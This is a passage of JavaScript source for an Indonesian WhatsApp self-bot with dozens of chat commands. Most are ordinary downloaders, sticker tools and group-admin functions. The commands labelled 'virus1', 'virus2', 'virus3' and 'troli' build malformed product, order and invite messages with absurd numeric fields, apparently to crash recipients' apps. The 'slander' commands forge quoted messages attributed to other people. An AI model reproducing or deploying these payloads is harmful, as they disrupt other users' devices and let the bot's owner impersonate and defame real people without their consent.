alpha.sendMessage(from, starGame, text, {quoted: mek, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})
break
    case 'voting':
            if(!isGroupAdmins && !mek.key.fromMe) return reply('only admin gc')
            if(!isGroup) return reply(mess.only.group)
            if (isVote) return reply('Sesi Voting Sedang Berlangsung Di Grup Ini')
            if(!q) return reply('*Voting*\n\n'+ prefix+ 'voting @tag target | reason  | 1 (1 = 1 Menit)')
            if (mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || mek.message.extendedTextMessage.contextInfo == null) {
            let id = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            split = args.join(' ').replace('@', '').split('|')
            if(!Number(split[2])) return reply('masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit')
            await mentions('Vote ' +'@'+ id.split('@')[0]+' Di Mulai' +'\n\n' + `vote = ✅${enter}devote = ❌${enter}${enter}Alasan: ${split[1]}`,[id],true)
            addVote(from,split[1],split[0],split[2],reply)
            }
            break
case 'twmp4':
if (args.length < 1) return reply('Link?')
lin = args[0]
reply(mess.wait)
hx.twitter(lin).then(res => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
fto = fs.readFileSync(`./image/${thumbnail}`)
alpha.sendMessage(from, fto, image, {quoted:mek, caption:`*TWITTER MP4*${enter}${enter}•> Hd : ${res.HD}${enter}•> Sd : ${res.SD}${enter}•> Audio : ${res.audio}${enter}${enter}_Please wait, the media file is being sent it may take a few minutes_`, thumbnail: fs.readFileSync(`./image/${thumbnail}`), contextInfo:{forwardingScore: 989, isForwarded: true}})
sendMediaURL(from, Anu, 'Done!')
})
break
case 'twmp3':
if (args.length < 1) return reply('Link?')
lin = args[0]
reply(mess.wait)
hx.twitter(lin).then(async (res) => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
fto = fs.readFileSync(`./image/${thumbnail}`)
alpha.sendMessage(from, fto, image, {quoted:mek, caption:`*TWITTER MP3*${enter}${enter}•> Hd : ${res.HD}${enter}•> Sd : ${res.SD}${enter}•> Audio : ${res.audio}${enter}${enter}_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:fs.readFileSync(`./image/${thumbnail}`), contextInfo:{forwardingScore: 989, isForwarded: true}})
khs = await getBuffer(Anu)
alpha.sendMessage(from, khs, audio, {mimetype:'audio/mp4', filename:'alphagan.mp3', quoted:mek, ptt:true})
})
break
case 'surah':
if (!mek.key.fromMe && !isOwner) return
if (args.length < 1) return reply(`Example :${enter}${prefix}surah 1`)
srh = args[0]
hx.surah(srh).then(res => {
teks = '```「 AL-QURAN 」```\n\n'
for (let i of res) {
teks += '*•> Arab :* ' + i.arab + '\n'
teks += '*•> Indo :* ' + i.indo + '\n'
teks += '*•> Latin :* ' + i.latin + '\n\n'
}
reply(teks)
})
break
case 'styletext':
if (args.length < 1) return reply('Enter The Text')
async function stylizeText(text) {
let res = await fetch('http://qaz.wtf/u/convert.cgi?text=' + encodeURIComponent(text))
let html = await res.text()
let dom = new JSDOM(html)
let table = dom.window.document.querySelector('table').children[0].children
let obj = {}
for (let tr of table) {
let name = tr.querySelector('.aname').innerHTML
let content = tr.children[1].textContent.replace(/^\n/, '').replace(/\n$/, '')
obj[name + (obj[name] ? ' Reversed' : '')] = content
}
return obj
}
matext = args.join(" ")
let fetch = require('node-fetch')
let { JSDOM } = require('jsdom')
alpha.reply(m.chat, Object.entries(await stylizeText(matext)).map(([name, value]) => `\`\`\`「 ${name} 」\`\`\`${enter}${enter}${value}${enter}${enter}—————————————————————————`).join`${enter}${enter}`, m)
break
case 'virus3':
if (!isOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
let buf = fs.readFileSync(`./image/${thumbnail}`)
imeu = await alpha.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await alpha.prepareMessageFromContent(from,{
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": "162533333338378",
"groupName": `SUB ZEEONE OFC ${vipi}`,
"jpegThumbnail":buf, 
"caption": "https://chat.whatsapp.com/GY74IwuwLlFELw97ByRk79",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:imeu, contextInfo:{}})
alpha.relayWAMessage(res)
break
case 'tag':
noes = `${args[0]}@s.whatsapp.net`
beks = `@${noes.split("@")[0]}`
alpha.sendMessage(from, beks, text, {quoted:mek, contextInfo:{mentionedJid:[noes]}})                
break
case 'q': 
if (!m.quoted) return reply('reply message!')
let qse = alpha.serializeM(await m.getQuotedObj())
if (!qse.quoted) return reply('the message you replied does not contain a reply!')
await qse.quoted.copyNForward(m.chat, true)
break
case 'hbd': 
let textus = args.join(" ")
if (!q) return reply(`Example:${enter} 2002 02 25`)
const zodiak = [
    ["Capricorn", new Date(1970, 0, 1)],
    ["Aquarius", new Date(1970, 0, 20)],
    ["Pisces", new Date(1970, 1, 19)],
    ["Aries", new Date(1970, 2, 21)],
    ["Taurus", new Date(1970, 3, 21)],
    ["Gemini", new Date(1970, 4, 21)],
    ["Cancer", new Date(1970, 5, 22)],
    ["Leo", new Date(1970, 6, 23)],
    ["Virgo", new Date(1970, 7, 23)],
    ["Libra", new Date(1970, 8, 23)],
    ["Scorpio", new Date(1970, 9, 23)],
    ["Sagittarius", new Date(1970, 10, 22)],
    ["Capricorn", new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
    let d = new Date(1970, month - 1, day)
    return zodiak.find(([_,_d]) => d >= _d)[0]
}
    const date = new Date(textus)
    if (date == 'Invalid Date') throw date
    const d = new Date()
    const [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
    const birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
    
    const zodiac = getZodiac(birth[1], birth[2])
    const ageD = new Date(d - date)
    const age = ageD.getFullYear() - new Date(1970, 0, 1).getFullYear()

    const birthday = [tahun + (birth[1] < bulan), ...birth.slice(1)]
    const cekusia = bulan === birth[1] && tanggal === birth[2] ? `Happy -${age}th Birthday 🥳🎉` : age

    const teksh = `
Birth : ${birth.join('-')}
Upcoming hbd : ${birthday.join('-')}
Age : ${cekusia}
Zodiak : ${zodiac}
`.trim()
    m.reply(teksh)
break
case 'leave':
if (!isOwner && !mek.key.fromMe) return
if (args.length < 1) return reply(`\`\`\`Example :\`\`\`${enter}\`\`\`${prefix}leave <id>\`\`\``)
ids = args.join(" ")
try {
alpha.groupLeave(ids)
reply(`Succes leave group ${ids}`)
} catch(e) {
reply('Error!')
}
break
case 'listgroup':
case 'listgrup':
case 'listgrop':
case 'gruplist':
case 'groplist':
case 'grouplist':
const txs = alpha.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`•> ${alpha.getName(v.jid)}${enter}${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`${enter}~~${enter}`
alpha.sendMessage(m.chat, '```「 LIST GROUPS 」```\n\n' + txs, text)
break
case 'searchtext':
if (args.length < 1) return reply(`${petik}Wrong Format${petik} What Message Are You Looking For Bro??${enter}Example : ${prefix}searchtext halo|10`)
tekse = args.join('')
if (tekse.includes("|")) { 
try {
var ve = tekse.split("|")[0]
var za = tekse.split("|")[1]
if (za > 15) return reply('minimum 15')
sampai = `${za}`
batas = parseInt(sampai) + 1
cok = await alpha.searchMessages(`${ve}`, from, batas,1) 
if (cok.messages.lenght < 2) return reply('Message Not Found') 
if (cok.messages.length < parseInt(batas)) reply(`Found Only ${cok.messages.length - 1} Messages`)
for (let i=1;i < cok.messages.length;i++) {
if (cok.messages[i].message) {
alpha.sendMessage(from, `Here The Message!`, text, {quoted: cok.messages[i]}) 
}
}
} catch(e) {
console.log(e)
return reply(`${petik}ERROR${petik} An error occurred while searching for Messages`)
}
} else {
reply(`Wrong format, this is an example of the correct format : ${prefix}searchtext halo|15`)
}
break
case 'group':
if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
if (args[0] === 'open') {
reply(`*SUCCES OPEN GROUP*`)
alpha.groupSettingChange(from, GroupSettingChange.messageSend, false)
} else if (args[0] === 'close') {
reply(`*SUCCES CLOSE GROUP*`)
alpha.groupSettingChange(from, GroupSettingChange.messageSend, true)
}
break
case 'setdesc':
if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
alpha.groupUpdateDescription(from, `${args.join(" ")}`)
alpha.sendMessage(from, 'Succes change description group', text, {quoted:mek})
break
case 'setname':
if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
alpha.groupUpdateSubject(from, `${args.join(" ")}`)
alpha.sendMessage(from, 'Succes change name group', text, {quoted:mek})
break
case 'groupinfo':
if (!isGroup) return
ppUrl = await alpha.getProfilePicture(from) // leave empty to get your own
buffergbl = await getBuffer(ppUrl)
alpha.sendMessage(from, buffergbl, image, {quoted: mek, caption: `\`\`\`「 GROUP INFO 」\`\`\`${enter}*•> Name* : ${groupName}${enter}*•> Member* : ${groupMembers.length}${enter}*•> Admin* : ${groupAdmins.length}${enter}*•> Description* : ${enter}${groupDesc}`})
break
case 'demote':
if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isGroup) return
if (!isBotGroupAdmins) return reply('Bot not admin')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply members')
mentionede = mek.message.extendedTextMessage.contextInfo.participant
alpha.groupDemoteAdmin(from, [mentionede])
teks = `Members @${mentionede.split('@')[0]} succes demote`
alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid:[mentionede]}})
break
case 'promote':
if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isGroup) return
if (!isBotGroupAdmins) return reply('Bot not admin')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply members')
mentionede = mek.message.extendedTextMessage.contextInfo.participant
alpha.groupMakeAdmin(from, [mentionede])
teks = `Members @${mentionede.split('@')[0]} succes promote`
alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid:[mentionede]}})
break
case 'revoke':
if (!mek.key.fromMe && !isOwner && !isGroupAdmins) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
alpha.revokeInvite(from)
reply('```Succes revoke link group```')
break
case 'virus1':
if (!isOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
let buff = fs.readFileSync(`./image/${thumbnail}`)
imeu = await alpha.prepareMessage('0@s.whatsapp.net', buff, image) 
imeg = imeu.message.imageMessage
res = await alpha.prepareMessageFromContent(from,{
"productMessage": {
"product": {
"productImage": imeg,
"productId": "359531915900587",
"title": `SUB ZEEONE OFC`,
"description": `${vipi}`,
"currencyCode": "USD",
"priceAmount1000": "919919191919191919191919",
"productImageCount": 1
},
"businessOwnerJid": "62887435047326@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted: mek, contextInfo:{}}) 

alpha.relayWAMessage(res)
break
case 'virus2': 
if (!isOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
let bugf = fs.readFileSync(`./image/${thumbnail}`)
imeu = await alpha.prepareMessage('0@s.whatsapp.net', bugf, image) 
imeg = imeu.message.imageMessage
res = await alpha.prepareMessageFromContent(from,{
"orderMessage": {
"orderId": "359531915900587",
"thumbnail": fs.readFileSync(`./image/${thumbnail}`),
"itemCount": 1000000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "ZEEONE OFC",
"message":"You & Me ☕",
"sellerJid": "62887435047326@s.whatsapp.net",
"token": "AR5b5YFz2g4W5fYrjbeakPiI3/XxarATSeP+KLh+0FGwkw==",
"totalAmount1000": "99999999999999999999",
"totalCurrencyCode": "IDR",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:bugtrol, contextInfo:{}}) 

alpha.toggleDisappearingMessages(from, 'Hemmm')
alpha.relayWAMessage(res)
break
case 'troli': 
if (!isOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
let bbuf = fs.readFileSync(`./image/${thumbnail}`)
imeu = await alpha.prepareMessage('0@s.whatsapp.net', bbuf, image) 
imeg = imeu.message.imageMessage
res = await alpha.prepareMessageFromContent(from,{
"orderMessage": {
"orderId": "150453297177375",
"thumbnail": fs.readFileSync(`./image/${thumbnail}`), 
"itemCount": 91919191911991919191929201,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "ZEEONE OFC",
"message":"Hallo Kak",
"sellerJid": "62887435047326@s.whatsapp.net",
"token": "AR5b5YFz2g4W5fYrjbeakPiI3/XxarATSeP+KLh+0FGwkw==",
"totalAmount1000": "99999999999999999999",
"totalCurrencyCode": "USD",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:imeu, contextInfo:{}}) 

alpha.relayWAMessage(res)
break
case 'linkgc':
case 'linkgrup':
case 'linkgrop':
case 'linkgroup':
if (!isGroup) return
if (!isBotGroupAdmins) return reply('Bot not admin')
linkgc = await alpha.groupInviteCode(from)
yeh = `\`\`\`「 Link Group 」\`\`\`${enter}•> Group Whatsapp :${enter}https://chat.whatsapp.com/${linkgc}`
alpha.sendMessage(from, yeh, text, { quoted: mek })
break
case 'kick':
if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin!')
if (!isGroup) return
if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (entah.length > 1) {
var mems_ids = []
for (let ids of entah) {
mems_ids.push(ids)
}
alpha.groupRemove(from, mems_ids)
} else {
alpha.groupRemove(from, [entah[0]])
}
} else {
entah = mek.message.extendedTextMessage.contextInfo.participant
alpha.groupRemove(from, [entah])
}
break
case 'add':  
                    if (!isGroup) return reply('```Only group```')
                if (!isGroupAdmins)return reply('```Only grup admins```')
                if (!isBotGroupAdmins) return reply('```Jadikan bot sebagai admin```')
                if (args.length < 1) return reply('Yang mau di add?')
					if (args[0].startsWith('08')) return reply('Gunakan kode negara')
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('tag yg ingin di kick!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
					teks = ''
					for (let _ of mentioned) {
					teks += `byeee🏃 :${enter}`
					teks += `@_.split('@')[0]`
					}
					mentions(teks, mentioned, true)
					alpha.groupAdd(from, mentioned)
					} else {
						try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						alpha.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('Gagal menambahkan target, mungkin karena di private')
					}
					}					
					break 
case 'owner':
case 'admin':
let ini_list = [] 
for (let i of ownerNumbers) {
const vname = alpha.contacts[i] != undefined ? alpha.contacts[i].vname || alpha.contacts[i].notify : undefined
ini_list.push({
"displayName": `${creator}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${alpha.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
hehe = await alpha.sendMessage(from, {
"displayName": `${ini_list.length} kontak`,
"contacts": ini_list 
}, 'contactsArrayMessage', { quoted: mek })
alpha.sendMessage(from,'Nih Kak Owner Ku ><',text,{quoted: hehe})
break
case 'deletepc':
if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
anu = await alpha.chats.all().filter(v => v.jid.endsWith('s.whatsapp.net'))
for (let _ of anu) {
alpha.modifyChat(_.jid, 'delete', {
includeStarred: false
})
}
await reply(`Berhasil menghapus ${anu.length} pribadi chat`)
break
case 'on':
if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
offline = false
reply(' ``ANDA TELAH ONLINE``` ')
break
case 'status':
case 'mystat':
case 'botstat':
teks = `\`\`\`「 STATISTIK BOT 」\`\`\`

${petik}々 Base : SELF-BOT${petik}
${petik}々 Recode : Zeeone${petik}
${petik}々 Lib : Baileys, ${bailver}${petik}
${petik}々 Prefix : ${prefix}${petik}
${petik}々 Versi Bot : ${botver}${petik}

${petik}々 Merk HP : ${device_manufacturer}${petik}
${petik}々 Versi OS : ${os_version}${petik}
${petik}々 Versi HP : ${device_model}${petik}
${petik}々 MCC : ${mcc}${petik}
${petik}々 MNC : ${mnc}${petik}
${petik}々 Baterai : ${isBattre}${petik}
${petik}々 Charger : ${isCharge}${petik}
${petik}々 Whatsapp : ${wa_version}${petik}
${petik}々 Blockir : ${blocked.length} Blocked${petik}
${petik}々 Group Chat : ${totalgroup.length} Chat${petik}
${petik}々 Personal Chat : ${totalkontak.length} Chat${petik}
${petik}々 Total Chat : ${totalchat.length} Chat${petik}
${petik}々 Speed : ${latensi.toFixed(4)} Second${petik}
${petik}々 Runtime : ${kyun(run)}${petik}`
alpha.sendMessage(from, teks, text, {quoted: ftoko})
break
    case 'off':
            if (!mek.key.fromMe && !isOwner) return 
            offline = true
            waktu = Date.now()
            anuu = args.join(' ') ? args.join(' ') : '-'
            alasan = anuu
            reply(' ```ANDA TELAH OFFLINE``` ')
            break   
    case 'get':
            if(!q) return reply('linknya?')
            reply(mess.wait)
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            fakestatus(bu)
            })   
            break
    case 'kontag':
            if (!mek.key.fromMe && !isOwner) return reply('SELF-BOT')
            pe = args.join('')
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            members_ids = []
            for (let mem of groupMembers) {
            members_ids.push(mem.jid)
            }
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            alpha.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
            break
    case 'sticktag':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await alpha.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            alpha.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else {
            reply(`*Reply sticker yang sudah dikirim*`)
            }
            break
    case 'totag':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await alpha.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            alpha.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await alpha.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            alpha.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await alpha.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'audio/mp4',
            	ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            alpha.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await alpha.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            alpha.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    case 'slander':
            if (args.length < 1) return reply(`Usage :${enter}${prefix}fitnah [@tag|pesan|balasanbot]]${enter}${enter}Ex : ${enter}${prefix}fitnah @tagmember|hai|hai juga`)
            var gh = args.join('')
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
            var replace = gh.split("|")[0];
            var target = gh.split("|")[1];
            var bot = gh.split("|")[2];
            alpha.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            break
    case 'settarget':
            if(!q) return reply(`${prefix}settarget 628xxxxx`)
            targetpc = args[0]
            fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`)
            break
    case 'slanderpm':
            if(!q) return reply(`${prefix}fitnahpc teks target|teks lu`)
            jids = `${targetpc}@s.whatsapp.net` 
            var splitt = args.join(' ').replace(/@|\d/gi, '').split('|')
            var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            var options = {contextInfo: {quotedMessage: {extendedTextMessage: {text: splitt[0]}}}}
            const responye = await alpha.sendMessage(jids, `${splitt[1]}`, MessageType.text, options)
            await alpha.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
            break
    case 'tomp3':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await alpha.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            alpha.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case 'fast':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await alpha.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            alpha.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case 'slow':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await alpha.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            alpha.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case 'reverse':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await alpha.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            alpha.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case 'anime':
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            alpha.sendMessage(from,media,image,{quoted:mek,caption:'NIH'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
    case 'kontak':
            pe = args.join(' ') 
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            alpha.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
            break    
    case 'take':
    case 'colong':
    		if (!isQuotedSticker) return reply('Stiker aja om')
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		    media = await alpha.downloadAndSaveMediaMessage(encmedia)
            anu = args.join(' ').split('|')
            satu = anu[0] !== '' ? anu[0] : `SELF`
            dua = typeof anu[1] !== 'undefined' ? anu[1] : `BOT`
            require('./lib/fetcher.js').createExif(satu, dua)
			require('./lib/fetcher.js').modStick(media, alpha, mek, from)
			break
	case 'stikerwm':
	case 'stickerwm':
    case 'swm':
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
            const encmedia = isQuotedImage   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
             media = await alpha.downloadAndSaveMediaMessage(encmedia)
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            alpha.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./lib/data.exif', out, '-o', _out])
            .on('exit', () => {
            alpha.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out) 
            } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
            const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            const media = await alpha.downloadAndSaveMediaMessage(encmedia)
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            alpha.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./lib/data.exif', out, '-o', _out])
            .on('exit', () => {
            alpha.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
